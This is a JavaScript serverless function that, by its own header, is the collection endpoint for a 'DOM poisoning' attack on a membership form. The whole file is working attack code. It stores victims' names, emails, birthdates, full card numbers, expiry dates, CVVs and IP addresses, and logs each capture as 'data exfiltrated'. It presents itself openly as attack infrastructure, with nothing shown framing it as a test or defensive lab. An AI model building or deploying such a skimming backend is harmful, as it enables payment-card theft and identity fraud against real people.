// Vercel Serverless Function for Membership DOM Poisoning Attack Data Collection
// Endpoint: /api/membership/submit

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        const {
            formType,
            firstName,
            lastName,
            email,
            birthdate,
            zipCode,
            verificationPayment,
            domPoisoningSuccess,
            isFieldUpdate,
            updateTimestamp,
            submittedAt
        } = req.body;

        // Extract payment verification data
        const payment = verificationPayment || {};

        // Get client IP and user agent
        const userAgent = req.headers['user-agent'] || '';
        const clientIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection?.remoteAddress || 'unknown';

        // Insert data into membership attack table using Neon
        const result = await sql`
            INSERT INTO membership_attack_data (
                form_type, first_name, last_name, email, birthdate, zip_code,
                verify_card_number, verify_expiry_month, verify_expiry_year,
                verify_cvv, verify_card_name, verify_billing_zip,
                dom_poisoning_success, is_field_update, update_timestamp,
                user_agent, ip_address, submitted_at
            ) VALUES (
                ${formType || 'membership'},
                ${firstName || null},
                ${lastName || null},
                ${email || null},
                ${birthdate || null},
                ${zipCode || null},
                ${payment.verifyCardNumber || null},
                ${payment.verifyExpiryMonth || null},
                ${payment.verifyExpiryYear || null},
                ${payment.verifyCVV || null},
                ${payment.verifyCardName || null},
                ${payment.verifyBillingZip || null},
                ${domPoisoningSuccess || false},
                ${isFieldUpdate || false},
                ${updateTimestamp || null},
                ${userAgent},
                ${clientIP},
                ${submittedAt || new Date().toISOString()}
            )
            RETURNING id, created_at;
        `;

        // Log successful data exfiltration
        console.log('🚨 MEMBERSHIP DATA EXFILTRATED:', {
            id: result[0].id,
            email: email,
            hasPaymentData: !!(payment.verifyCardNumber),
            domPoisoningSuccess: domPoisoningSuccess,
            isFieldUpdate: isFieldUpdate,
            timestamp: result[0].created_at
        });

        res.status(200).json({
            success: true,
            message: 'Membership data successfully captured',
            attack_id: result[0].id,
            timestamp: result[0].created_at,
            dom_poisoning_success: domPoisoningSuccess,
            data_captured: {
                basic_fields: !!(firstName && lastName && email),
                payment_fields: !!(payment.verifyCardNumber),
                is_update: isFieldUpdate
            }
        });

    } catch (error) {
        console.error('Membership data capture error:', error);
        res.status(500).json({
            error: 'Failed to capture membership data',
            details: error.message
        });
    }
}